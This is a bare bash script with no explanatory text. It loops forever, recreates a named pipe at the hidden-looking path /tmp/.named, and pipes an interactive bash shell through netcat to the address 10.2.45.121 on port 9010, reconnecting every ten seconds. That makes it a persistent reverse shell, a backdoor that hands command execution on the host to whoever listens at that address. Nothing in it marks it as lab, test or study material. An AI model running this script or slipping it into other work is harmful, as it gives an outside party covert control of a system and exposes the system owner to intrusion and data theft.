#!/bin/bash

while [ 1 ];
do
	rm -f /tmp/.named; mkfifo /tmp/.named; cat /tmp/.named | bash -i 2>&1 | nc 10.2.45.121 9010 > /tmp/.named
	sleep 10;
done
